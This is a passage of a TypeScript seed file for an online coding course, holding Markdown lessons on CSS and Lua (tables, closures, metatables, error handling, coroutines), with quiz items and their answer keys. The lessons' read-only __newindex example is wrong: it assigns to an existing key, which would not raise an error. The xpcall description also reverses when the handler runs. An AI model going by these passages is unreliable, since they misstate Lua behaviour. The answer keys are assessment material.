          answer: 'keyframes',
        },
      ],
    },
  },
  {
    title: 'Final Project: Style a Responsive Landing Page',
    content: lessonContent(
      'Final Project: Style a Responsive Landing Page',
      `Take a plain HTML page (your own, or a simple one you write for this project) and turn it into a polished, responsive landing page.\n\n## Requirements\n\n1. Set \`box-sizing: border-box\` globally and use a consistent spacing scale (e.g. multiples of 8px) for padding and margin.\n2. Build the page's navigation bar with Flexbox (logo on one side, links on the other).\n3. Build at least one section, like a feature list or pricing cards, using CSS Grid with \`repeat()\` and \`minmax()\` so it reflows automatically.\n4. Add at least one \`@media\` breakpoint that meaningfully changes the layout between mobile and desktop (e.g. stacked cards become a 3-column grid).\n5. Add at least one \`transition\` (e.g. on button hover) and one \`@keyframes\` animation somewhere on the page.\n\n## Stretch goals\n\n- Add a dark mode using the \`prefers-color-scheme\` media query.\n- Use CSS custom properties (\`--brand-color: #2563eb;\`) for your color palette so the whole page can be re-themed by changing a handful of variables.\n- Run the page through Lighthouse in Chrome DevTools and address any layout-related warnings.\n\nSubmit a link to your finished page (a repo, CodePen, or hosted URL) below, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const luaLessons: SeedLesson[] = [
  {
    title: 'Why Lua? Getting Started',
    content: lessonContent(
      'Why Lua? Getting Started',
      `Lua is a small, fast, embeddable scripting language. You'll rarely run a "Lua application" on its own, instead, Lua gets embedded inside something bigger: game engines (Roblox, Love2D, World of Warcraft addons), Neovim configuration, and even network appliances.\n\n## Why it's popular for embedding\n\n- **Tiny and fast**, the reference interpreter is a few hundred KB and famously quick for a dynamic language.\n- **Simple to embed**, a C program can create a Lua interpreter, hand it data, and call Lua functions in only a few lines.\n- **Small core language**, few keywords, one data structure (the table) that does almost everything.\n\n## Your first script\n\n\`\`\`lua\nprint("Hello from Lua!")\n\nlocal name = "Kodstigen"\nprint("Welcome to " .. name)\n\`\`\`\n\nRun it with:\n\n\`\`\`bash\nlua hello.lua\n\`\`\`\n\n- \`print\` writes a line to standard output.\n- \`local\` declares a variable scoped to the current block, without it, a variable is **global** by default, almost always a mistake.\n- \`..\` is the string concatenation operator (Lua does not overload \`+\` for strings the way JavaScript does).\n\n> [!NOTE]\n> Lua array/table indices start at **1**, not 0. This trips up almost everyone coming from C-family languages, and it's worth committing to memory right now.`
    ),
    quiz: {
      title: 'Lua Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which operator concatenates two strings in Lua?',
          options: ['+', '&', '..', '.'],
          answer: '..',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Lua table and array indices start at 1 by convention, not 0.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Declaring a variable with the ____ keyword scopes it to the current block instead of making it global.',
          options: [],
          answer: 'local',
        },
      ],
    },
  },
  {
    title: 'Variables, Types, and Control Flow',
    content: lessonContent(
      'Variables, Types, and Control Flow',
      `Lua is dynamically typed, a variable's type is decided by whatever value it currently holds, and can change at runtime.\n\n## Basic types\n\n\`\`\`lua\nlocal xp = 100          -- number (Lua has no separate int/float, just "number")\nlocal name = "Ada"       -- string\nlocal passed = true      -- boolean\nlocal nothing = nil      -- absence of a value\nlocal scores = {90, 85, 100} -- table (used for arrays, maps, and objects)\n\nprint(type(xp), type(name), type(passed), type(nothing), type(scores))\n\`\`\`\n\n\`nil\` is Lua's "no value", it's what an undeclared variable holds, and it's the only value besides \`false\` that counts as falsy in a condition.\n\n## Control flow\n\n\`\`\`lua\nlocal xp = 45\n\nif xp >= 50 then\n  print("Level up!")\nelseif xp >= 25 then\n  print("Halfway there.")\nelse\n  print("Keep going.")\nend\n\nfor i = 1, 5 do\n  print("Lesson " .. i)\nend\n\nlocal count = 0\nwhile count < 3 do\n  print("count = " .. count)\n  count = count + 1\nend\n\`\`\`\n\n- Every block (\`if\`, \`for\`, \`while\`, functions) is closed with the keyword \`end\`, there are no curly braces in Lua.\n- \`for i = 1, 5 do ... end\` is a **numeric for loop**: start, stop, and an optional step (\`for i = 10, 1, -1\` counts down).\n- Only \`nil\` and \`false\` are falsy, everything else, including \`0\` and \`""\`, is truthy. This is a common gotcha for people coming from JavaScript or Python.\n\n> [!WARNING]\n> Unlike most C-family languages, \`0\` is **truthy** in Lua. \`if 0 then print("yes") end\` prints "yes". Only \`nil\` and \`false\` are falsy.`
    ),
    quiz: {
      title: 'Types & Control Flow Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which two values are considered "falsy" in a Lua condition?',
          options: ['nil and false', '0 and ""', 'nil and 0', 'false and 0'],
          answer: 'nil and false',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Lua uses curly braces { } to open and close if/for/while blocks.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Every Lua block (if, for, while, function) must be closed with the keyword ____.',
          options: [],
          answer: 'end',
        },
      ],
    },
  },
  {
    title: "Tables: Lua's Only Data Structure",
    content: lessonContent(
      "Tables: Lua's Only Data Structure",
      `Lua has exactly one built-in data structure, the **table**, and it does the job of arrays, dictionaries/maps, and even objects in other languages.\n\n## Tables as arrays\n\n\`\`\`lua\nlocal scores = {90, 85, 100}\n\nprint(scores[1])       -- 90, indices start at 1\nprint(#scores)          -- 3, the length operator\n\ntable.insert(scores, 75)  -- appends to the end\ntable.remove(scores, 1)   -- removes the first element, shifts the rest down\n\nfor i, score in ipairs(scores) do\n  print(i, score)\n end\n\`\`\`\n\n\`ipairs\` iterates a table in order from index 1 until the first \`nil\`, exactly what you want for array-like tables.\n\n## Tables as maps/objects\n\n\`\`\`lua\nlocal player = {\n  name = "Ada",\n  xp = 250,\n  ["favorite color"] = "blue", -- keys with spaces need bracket syntax\n}\n\nprint(player.name)               -- dot syntax, sugar for player["name"]\nprint(player["favorite color"])  -- bracket syntax, required for non-identifier keys\n\nplayer.level = 3 -- adding a new key is just an assignment\n\nfor key, value in pairs(player) do\n  print(key, value)\nend\n\`\`\`\n\n\`pairs\` iterates every key in a table, in an unspecified order, use it for map-style tables where order doesn't matter. \`player.name\` and \`player["name"]\` always refer to the exact same table entry, dot syntax is purely a convenience for string keys that are valid identifiers.\n\n> [!TIP]\n> Because arrays, maps, and objects are all "just a table" in Lua, a single table can even mix both styles: numeric indices for a list part and named keys for extra fields on the same object.`
    ),
    quiz: {
      title: 'Tables Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which built-in function iterates an array-like table in order from index 1?',
          options: ['pairs', 'ipairs', 'next', 'table.iter'],
          answer: 'ipairs',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'player.name and player["name"] refer to the same table entry.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The # operator in front of a table, like #scores, returns the table\'s ____.',
          options: [],
          answer: 'length',
        },
      ],
    },
  },
  {
    title: 'Functions and Scope',
    content: lessonContent(
      'Functions and Scope',
      `Functions in Lua are values, they can be stored in variables, passed as arguments, and returned from other functions, just like tables or numbers.\n\n## Defining and calling functions\n\n\`\`\`lua\nlocal function add(a, b)\n  return a + b\nend\n\nprint(add(2, 3)) -- 5\n\n-- Multiple return values\nlocal function minMax(numbers)\n  local lo, hi = numbers[1], numbers[1]\n  for _, n in ipairs(numbers) do\n    if n < lo then lo = n end\n    if n > hi then hi = n end\n  end\n  return lo, hi\nend\n\nlocal lowest, highest = minMax({4, 1, 9, 2})\nprint(lowest, highest) -- 1  9\n\`\`\`\n\nLua functions can return **multiple values** at once, something many other languages need a tuple or object to fake.\n\n## Scope with local vs. global\n\n\`\`\`lua\nxp = 100        -- global! visible everywhere, including other files\n\nlocal function levelUp()\n  local bonus = 10 -- local: only visible inside this function\n  xp = xp + bonus\nend\n\nlevelUp()\nprint(xp) -- 110\nprint(bonus) -- nil, bonus does not exist outside levelUp\n\`\`\`\n\n> [!WARNING]\n> Forgetting \`local\` silently creates a **global** variable, visible to your entire program (and, if you're embedded in a game or app, potentially to other scripts too). Get in the habit of typing \`local\` in front of every variable and function unless you deliberately want it global.\n\n## Functions as arguments\n\n\`\`\`lua\nlocal function forEach(list, callback)\n  for _, item in ipairs(list) do\n    callback(item)\n  end\nend\n\nforEach({"a", "b", "c"}, function(item)\n  print("Item: " .. item)\nend)\n\`\`\`\n\nPassing an anonymous \`function(...) ... end\` directly as an argument is idiomatic Lua, this is exactly how callback-style APIs (like button click handlers in game engines) are typically used.`
    ),
    quiz: {
      title: 'Functions & Scope Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What happens if you assign to a variable without the "local" keyword inside a function?',
          options: [
            'It causes a syntax error',
            'It creates a global variable',
            'It is scoped to that function only',
            'Lua infers whether it should be local automatically',
          ],
          answer: 'It creates a global variable',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A Lua function can return more than one value at a time.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The keyword used to define a function in Lua is ____.',
          options: [],
          answer: 'function',
        },
      ],
    },
  },
  {
    title: 'Metatables and Modules',
    content: lessonContent(
      'Metatables and Modules',
      `## Metatables: customizing table behavior\n\nA **metatable** is a table attached to another table that defines how it behaves for operations it doesn't natively support, like addition, or missing-key lookups. This is how Lua achieves "object-oriented programming" without a built-in \`class\` keyword.\n\n\`\`\`lua\nlocal Vector = {}\nVector.__index = Vector -- missing keys on an instance fall back to Vector\n\nfunction Vector.new(x, y)\n  local self = setmetatable({}, Vector)\n  self.x = x\n  self.y = y\n  return self\nend\n\nfunction Vector:length()\n  return math.sqrt(self.x ^ 2 + self.y ^ 2)\nend\n\nlocal v = Vector.new(3, 4)\nprint(v:length()) -- 5.0\n\`\`\`\n\n- \`setmetatable(t, mt)\` attaches metatable \`mt\` to table \`t\`.\n- \`__index\` is a special metamethod: when you look up a key that \`v\` doesn't have directly (like \`length\`), Lua checks \`__index\` next, this is how "instances" share methods defined on a common table.\n- \`function Vector:length()\` is sugar for \`function Vector.length(self)\`, the colon automatically adds a hidden \`self\` first parameter, and \`v:length()\` automatically passes \`v\` as that \`self\`.\n\n## Modules\n\nLua organizes reusable code into modules: files that return a table of functions. In a real project this would be two separate files:\n\n\`\`\`\n-- mathutils.lua\nlocal M = {}\n\nfunction M.double(n)\n  return n * 2\nend\n\nreturn M\n\`\`\`\n\n\`\`\`\n-- main.lua\nlocal mathutils = require("mathutils")\nprint(mathutils.double(21)) -- 42\n\`\`\`\n\n\`require\` loads a module by name, runs it once, and caches its returned value, calling \`require\` again for the same module returns the cached table instead of re-running the file. This course's sandbox only runs one file at a time, so here's the same idea inlined into a single runnable script:\n\n\`\`\`lua\nlocal function newMathUtils() -- stands in for a separate mathutils.lua file\n  local M = {}\n\n  function M.double(n)\n    return n * 2\n  end\n\n  return M\nend\n\nlocal mathutils = newMathUtils() -- in a real project: require("mathutils")\nprint(mathutils.double(21)) -- 42\n\`\`\`\n\n> [!TIP]\n> If you've used JavaScript's ES modules or Python's imports, \`require\` will feel familiar, the key difference is that a Lua module file explicitly \`return\`s the table of things it wants to expose, instead of using an \`export\` keyword.`
    ),
    quiz: {
      title: 'Metatables & Modules Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which metamethod lets a table fall back to another table when a key is missing?',
          options: ['__missing', '__index', '__default', '__fallback'],
          answer: '__index',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Calling require("mathutils") twice runs the mathutils.lua file twice.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The function used to attach a metatable to a table is ____(t, mt).',
          options: [],
          answer: 'setmetatable',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build a Text Adventure Game in Lua',
    content: lessonContent(
      'Final Project: Build a Text Adventure Game in Lua',
      `Put tables, functions, and control flow together into a small, playable text adventure.\n\n## Requirements\n\n1. Model at least three rooms as a table of tables, each with a description and a table of exits (e.g. \`{ north = "cave", south = "forest" }\`).\n2. Track the player's current room and inventory (a table used as a list) in local state.\n3. Write a main loop that prints the current room's description, reads a command from the player, and reacts to at least: moving through an exit, picking up an item, and checking inventory.\n4. Use functions to organize the logic, at minimum, a function to describe the current room and a function to handle a single command.\n5. Add a win condition, e.g. reaching a specific room, or collecting a specific item, that ends the loop with a victory message.\n\n## Stretch goals\n\n- Use a metatable so every room and item shares common behavior (like a generic \`:describe()\` method).\n- Split your rooms/items data into a separate module file and \`require\` it from your main script.\n- Add simple combat or a puzzle that requires an item from one room to progress past another.\n\nSubmit a link to your finished script (a repo or gist) below, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const luaIntermediateLessons: SeedLesson[] = [
  {
    title: 'Closures and Upvalues',
    content: lessonContent(
      'Closures and Upvalues',
      `Lua functions can reference variables from an enclosing scope even after that scope has returned, this is a **closure**. The captured variable is called an **upvalue**.\n\n## A closure example\n\n\`\`\`lua\nlocal function makeCounter()\n  local count = 0\n  return function()\n    count = count + 1\n    return count\n  end\nend\n\nlocal counter1 = makeCounter()\nlocal counter2 = makeCounter()\n\nprint(counter1()) -- 1\nprint(counter1()) -- 2\nprint(counter2()) -- 1, a separate count upvalue from counter1's\n\`\`\`\n\nEach call to \`makeCounter\` creates a **fresh** \`count\` variable, the inner function closes over that specific instance, not a shared global. \`counter1\` and \`counter2\` don't interfere with each other.\n\n## Why this matters\n\nClosures are how you build private state without a class: \`count\` isn't reachable from outside the returned function, there's no way to read or reset it except by calling \`counter1()\` again. This pattern shows up constantly, for example a memoized/cached computation.\n\n\`\`\`lua\nlocal function memoize(fn)\n  local cache = {}\n  return function(n)\n    if cache[n] == nil then\n      cache[n] = fn(n)\n    end\n    return cache[n]\n  end\nend\n\nlocal slowSquare = function(n) return n * n end\nlocal fastSquare = memoize(slowSquare)\n\nprint(fastSquare(5)) -- computes and caches\nprint(fastSquare(5)) -- returns the cached value\n\`\`\`\n\n> [!NOTE]\n> An upvalue is shared by reference, not copied. If two closures created in the *same* call to \`makeCounter\` both capture the same \`count\`, calling one will affect what the other sees. Each *separate call* to \`makeCounter\`, though, creates a brand-new \`count\`.`
    ),
    quiz: {
      title: 'Closures Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the name for a variable an inner function captures from its enclosing scope?',
          options: ['A global', 'An upvalue', 'A metatable', 'A vararg'],
          answer: 'An upvalue',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Two separate calls to the same closure-returning function share the exact same captured variable.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A function that captures variables from its enclosing scope is called a ____.',
          options: [],
          answer: 'closure',
        },
      ],
    },
  },
  {
    title: 'Object-Oriented Lua: Classes and Inheritance',
    content: lessonContent(
      'Object-Oriented Lua: Classes and Inheritance',
      `The Fundamentals course showed how \`setmetatable\` and \`__index\` turn a plain table into something like an instance. Here we build a full **class hierarchy** with inheritance.\n\n## A base class\n\n\`\`\`lua\nlocal Animal = {}\nAnimal.__index = Animal\n\nfunction Animal.new(name)\n  return setmetatable({ name = name }, Animal)\nend\n\nfunction Animal:speak()\n  return self.name .. " makes a sound."\nend\n\`\`\`\n\n## Inheriting from it\n\n\`\`\`lua\nlocal Dog = setmetatable({}, { __index = Animal }) -- Dog falls back to Animal\nDog.__index = Dog\n\nfunction Dog.new(name)\n  local self = Animal.new(name)   -- reuse the base constructor\n  return setmetatable(self, Dog)   -- but tag the instance as a Dog\nend\n\nfunction Dog:speak() -- overrides Animal:speak\n  return self.name .. " says woof!"\nend\n\nlocal generic = Animal.new("Creature")\nlocal rex = Dog.new("Rex")\n\nprint(generic:speak()) -- Creature makes a sound.\nprint(rex:speak())      -- Rex says woof!\n\`\`\`\n\nTwo \`__index\` links are at work: \`Dog\`'s metatable points \`__index\` at \`Animal\`, so a \`Dog\` instance whose class table (\`Dog\`) doesn't have a method falls through to \`Animal\`. Because \`Dog:speak\` *is* defined, it wins over \`Animal:speak\`, this is how overriding works.\n\n## Calling the parent's method\n\n\`\`\`lua\nfunction Dog:speak()\n  return Animal.speak(self) .. " (a very good boy)"\nend\n\`\`\`\n\nCalling \`Animal.speak(self)\` directly (dot syntax, explicit \`self\`) is how Lua does "super.method()" calls, there's no dedicated \`super\` keyword.\n\n> [!TIP]\n> This two-metatable pattern (class table linked to a parent class table, instances linked to their class table) is the idiomatic way OOP frameworks implement inheritance under the hood, now you know exactly what they're doing for you.`
    ),
    quiz: {
      title: 'OOP & Inheritance Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "To call a parent class's overridden method from a subclass, you...",
          options: [
            'Use the super keyword',
            'Call ParentClass.method(self, ...) directly',
            'Lua does this automatically',
            'It is not possible',
          ],
          answer: 'Call ParentClass.method(self, ...) directly',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Overriding Animal:speak with Dog:speak means Dog instances no longer have access to Animal's version unless explicitly called.",
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: "The metamethod that makes a missing method lookup fall back to another table is ____.",
          options: [],
          answer: '__index',
        },
      ],
    },
  },
  {
    title: 'String Patterns Deep Dive',
    content: lessonContent(
      'String Patterns Deep Dive',
      `Lua doesn't have full regular expressions, instead it has a lighter-weight **pattern** system built into \`string.find\`, \`string.match\`, \`string.gmatch\`, and \`string.gsub\`. Patterns cover the vast majority of real-world text processing without needing a heavyweight regex engine.\n\n## Character classes\n\n| Class | Matches |\n|---|---|\n| \`%a\` | a letter |\n| \`%d\` | a digit |\n| \`%s\` | whitespace |\n| \`%w\` | a letter or digit |\n| \`%p\` | punctuation |\n| \`.\`  | any character |\n\nUppercase versions (\`%A\`, \`%D\`, ...) match the *complement*. Quantifiers \`*\`, \`+\`, \`-\`, and \`?\` work similarly to regex, though \`-\` is a **lazy** (shortest) repeat, unlike \`*\`'s greedy repeat.\n\n## Capturing groups\n\n\`\`\`lua\nlocal date = "2026-07-06"\nlocal year, month, day = date:match("(%d+)-(%d+)-(%d+)")\nprint(year, month, day) -- 2026  07  06\n\`\`\`\n\nParentheses in a pattern create a **capture**, \`string.match\` returns one value per capture (or the whole match if there are none).\n\n## Iterating all matches with gmatch\n\n\`\`\`lua\nlocal text = "cat, dog, bird"\nfor word in text:gmatch("%a+") do\n  print(word)\nend\n-- cat\n-- dog\n-- bird\n\`\`\`\n\n## Search-and-replace with gsub\n\n\`\`\`lua\nlocal sentence = "Lua is great, Lua is fast"\nlocal replaced, count = sentence:gsub("Lua", "Kodstigen")\nprint(replaced) -- Kodstigen is great, Kodstigen is fast\nprint(count)    -- 2\n\n-- gsub can also take a function to compute each replacement\nlocal upper = sentence:gsub("%a+", function(word) return word:upper() end)\nprint(upper) -- LUA IS GREAT, LUA IS FAST\n\`\`\`\n\n\`gsub\` returns **two** values: the new string, and how many replacements were made, don't forget the second one if you only want the string.\n\n> [!WARNING]\n> Lua patterns are not regular expressions, features like alternation (\`a|b\`), non-capturing groups, and lookahead don't exist. For genuinely complex text processing, projects typically reach for a dedicated regex library instead of stretching patterns past what they're good at.`
    ),
    quiz: {
      title: 'String Patterns Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which character class matches a single digit in a Lua pattern?',
          options: ['%a', '%d', '%s', '%w'],
          answer: '%d',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'string.gsub returns only the new string, never a replacement count.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Parentheses in a Lua pattern create a ____, which string.match returns as a separate value.',
          options: [],
          answer: 'capture',
        },
      ],
    },
  },
  {
    title: 'Error Handling: pcall, xpcall, and error',
    content: lessonContent(
      'Error Handling: pcall, xpcall, and error',
      `Lua doesn't have try/catch, instead errors are handled with the built-in functions \`pcall\`, \`xpcall\`, \`error\`, and \`assert\`.\n\n## Raising errors\n\n\`\`\`lua\nlocal function withdraw(balance, amount)\n  if amount > balance then\n    error("insufficient funds")\n  end\n  return balance - amount\nend\n\`\`\`\n\nCalling \`error(message)\` immediately stops execution and unwinds the call stack, exactly like \`throw\` in other languages, except the "catch" is a separate function call rather than a block.\n\n## Catching errors with pcall\n\n\`\`\`lua\nlocal ok, result = pcall(withdraw, 100, 150)\n\nif ok then\n  print("New balance: " .. result)\nelse\n  print("Failed: " .. result) -- result holds the error message here\nend\n\`\`\`\n\n\`pcall\` ("protected call") runs a function and catches any error it raises. It always returns a boolean first (\`true\` if no error, \`false\` if one occurred), followed by either the function's return value(s), or the error message.\n\n## assert: a shortcut for a common check\n\n\`\`\`lua\nlocal function withdraw(balance, amount)\n  assert(amount <= balance, "insufficient funds")\n  return balance - amount\nend\n\`\`\`\n\n\`assert(condition, message)\` is sugar for "if condition is falsy, error(message)", used constantly to validate function arguments up front.\n\n## xpcall: catching errors with a custom handler\n\n\`\`\`lua\nlocal function riskyOperation()\n  error({ code = 42, reason = "something broke" }) -- errors can be any value, not just strings\nend\n\nlocal ok, err = xpcall(riskyOperation, function(e)\n  if type(e) == "table" then\n    return "Error " .. e.code .. ": " .. e.reason\n  end\n  return tostring(e)\nend)\n\nprint(err) -- Error 42: something broke\n\`\`\`\n\n\`xpcall\` is like \`pcall\` but takes a second argument, a **message handler** that runs while the stack is still unwound (useful for attaching a stack trace, or normalizing non-string error values like the table above).\n\n> [!TIP]\n> Reach for \`assert\` for "this should never happen if the caller used the API correctly" checks, and reserve \`error\` + \`pcall\` for situations the caller is expected to actually handle, like a failed network request or invalid user input.`
    ),
    quiz: {
      title: 'Error Handling Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What does pcall return first, before any of the wrapped function's own results?",
          options: ['The error message', 'A boolean success flag', 'Nothing', 'The function itself'],
          answer: 'A boolean success flag',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'In Lua, error() can only be called with a string message.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: '____(condition, message) raises an error with the given message if condition is falsy.',
          options: [],
          answer: 'assert',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build a Contact Book with Validated Errors',
    content: lessonContent(
      'Final Project: Build a Contact Book with Validated Errors',
      `Combine closures, OOP, patterns, and error handling into one small but real program: a contact book.\n\n## Requirements\n\n1. Model a \`ContactBook\` "class" (metatable + \`__index\`, like the Object-Oriented lesson) with methods to add, remove, and list contacts.\n2. Each contact needs a name and an email; validate the email with a string pattern (at minimum, requires an \`@\` and at least one \`.\` after it) and \`error()\`/\`assert()\` if it's invalid.\n3. Wrap every call that adds a contact in \`pcall\`, so a bad email prints a friendly error message instead of crashing the whole program.\n4. Add a \`search(term)\` method that uses \`string.find\` or \`gmatch\` to return every contact whose name contains \`term\` (case-insensitive).\n5. Use a closure to track how many contacts have ever been added in total (including ones later removed), exposed through a \`ContactBook:totalEverAdded()\` method, without storing it as a plain field on the instance.\n\n## Stretch goals\n\n- Support multiple emails per contact (a table of emails instead of one string).\n- Add an \`export()\` method that returns a single formatted string listing every contact, built with \`table.concat\`.\n- Persist contacts to a file with Lua's \`io\` library and reload them on startup (only relevant if you're running outside this course's browser sandbox).\n\nSubmit a link to your finished script (a repo or gist) below, an instructor will review it before you can mark this lesson complete.`
    ),
    requiresSubmission: true,
  },
];

const luaAdvancedLessons: SeedLesson[] = [
  {
    title: 'Coroutines: Cooperative Multitasking',
    content: lessonContent(
      'Coroutines: Cooperative Multitasking',
      `A **coroutine** is an independent thread of execution that you can pause and resume by hand, unlike OS threads, only one coroutine (or the main program) ever runs at a time, so there's no race condition to worry about.\n\n## Creating and resuming a coroutine\n\n\`\`\`lua\nlocal co = coroutine.create(function(a, b)\n  print("start", a, b)\n  local c = coroutine.yield(a + b) -- pauses here, returns a + b to the resumer\n  print("resumed with", c)\n  return "done"\nend)\n\nprint(coroutine.resume(co, 1, 2)) -- true  3   (prints "start 1  2" first)\nprint(coroutine.resume(co, 10))    -- true  done  (prints "resumed with  10" first)\nprint(coroutine.status(co))         -- dead\n\`\`\`\n\n- \`coroutine.create(fn)\` builds a coroutine **without** running it yet.\n- \`coroutine.resume(co, ...)\` starts/continues it, passing \`...\` in as arguments (either to the function itself, the first time, or as \`coroutine.yield\`'s return value on later resumes).\n- \`coroutine.yield(...)\` pauses the coroutine and hands \`...\` back to whoever called \`resume\`.\n- \`coroutine.status(co)\` reports \`"suspended"\`, \`"running"\`, \`"normal"\`, or \`"dead"\`.\n\n## A generator built on coroutines\n\n\`\`\`lua\nlocal function numberGenerator(limit)\n  return coroutine.wrap(function()\n    for i = 1, limit do\n      coroutine.yield(i)\n    end\n  end)\nend\n\nfor n in numberGenerator(5) do\n  print(n) -- 1 2 3 4 5, one per iteration\nend\n\`\`\`\n\n\`coroutine.wrap\` is \`coroutine.create\` plus automatic \`resume\` calls, wrapped in a plain function you can call directly (or use in a \`for ... in\` loop), it's the idiomatic way to build a lazy generator/iterator in Lua.\n\n> [!WARNING]\n> Unlike \`pcall\`, an error raised inside a coroutine created with \`coroutine.wrap\` propagates as a normal Lua error to the caller of the wrapped function. A coroutine made with plain \`coroutine.create\`, by contrast, reports the error as its second \`resume\` return value instead of raising it, check \`coroutine.resume\`'s boolean result if you use \`create\` directly.`
    ),
    quiz: {
      title: 'Coroutines Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does coroutine.yield do?',
          options: [
            'Terminates the coroutine permanently',
            'Pauses the coroutine and returns values to the resumer',
            'Creates a new coroutine',
            'Raises an error',
          ],
          answer: 'Pauses the coroutine and returns values to the resumer',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Two Lua coroutines can execute simultaneously on separate CPU cores.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: '____.wrap(fn) returns a plain callable function that automatically resumes the coroutine each call, ideal for building generators.',
          options: [],
          answer: 'coroutine',
        },
      ],
    },
  },
  {
    title: 'Advanced Metatables: Operator Overloading & __call',
    content: lessonContent(
      'Advanced Metatables: Operator Overloading & __call',
      `Fundamentals covered \`__index\` for method lookup. Metatables support many more **metamethods** that let a table respond to operators, comparisons, \`tostring\`, and even being called like a function.\n\n## Operator overloading\n\n\`\`\`lua\nlocal Vector = {}\nVector.__index = Vector\n\nfunction Vector.new(x, y)\n  return setmetatable({ x = x, y = y }, Vector)\nend\n\nVector.__add = function(a, b)\n  return Vector.new(a.x + b.x, a.y + b.y)\nend\n\nVector.__tostring = function(v)\n  return string.format("(%g, %g)", v.x, v.y)\nend\n\nVector.__eq = function(a, b)\n  return a.x == b.x and a.y == b.y\nend\n\nlocal v1 = Vector.new(1, 2)\nlocal v2 = Vector.new(3, 4)\n\nprint(v1 + v2)          -- (4, 6), uses __add, then __tostring for print\nprint(v1 == Vector.new(1, 2)) -- true, uses __eq\n\`\`\`\n\n\`print(v1 + v2)\` runs \`__add\` to build a new \`Vector\`, then \`print\` calls \`tostring\` on it, which invokes \`__tostring\`. Without \`__tostring\`, printing a table falls back to Lua's default \`table: 0x...\` representation.\n\n## __call: making a table callable\n\n\`\`\`lua\nlocal Multiplier = setmetatable({ factor = 3 }, {\n  __call = function(self, n)\n    return n * self.factor\n  end,\n})\n\nprint(Multiplier(10)) -- 30, calling the table like a function\n\`\`\`\n\n\`__call\` is what lets some libraries expose an object that's both a table of methods/config **and** directly invokable.\n\n## __newindex: intercepting new keys\n\n\`\`\`lua\nlocal readOnly = setmetatable({ pi = 3.14159 }, {\n  __newindex = function(_, key, _)\n    error("cannot set '" .. key .. "', this table is read-only")\n  end,\n})\n\nprint(readOnly.pi) -- 3.14159, ordinary reads still work\nreadOnly.pi = 4     -- errors: cannot set 'pi', this table is read-only\n\`\`\`\n\n\`__newindex\` only fires when you assign to a key that **doesn't already exist** in the table, it's the standard trick for building read-only tables, or a proxy that validates/logs writes.\n\n> [!NOTE]\n> There's a matching, easy-to-miss rule: \`__index\` (as a function) only fires on a **missing-key read**, and \`__newindex\` only fires on a **missing-key write**. Once a key genuinely exists on the table itself, both metamethods are bypassed entirely for that key.`
    ),
    quiz: {
      title: 'Advanced Metatables Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which metamethod lets a table be invoked like a function, e.g. myTable(10)?',
          options: ['__index', '__call', '__newindex', '__tostring'],
          answer: '__call',
        },
        {
          type: 'TRUE_FALSE',
          prompt: '__newindex fires every time you assign to any key on a table, even one that already exists.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Overloading the + operator for a custom table is done by defining the ____ metamethod.',
          options: [],
          answer: '__add',
        },
      ],
    },
  },
  {
    title: 'Variadic Functions and table.pack/unpack',
    content: lessonContent(
      'Variadic Functions and table.pack/unpack',
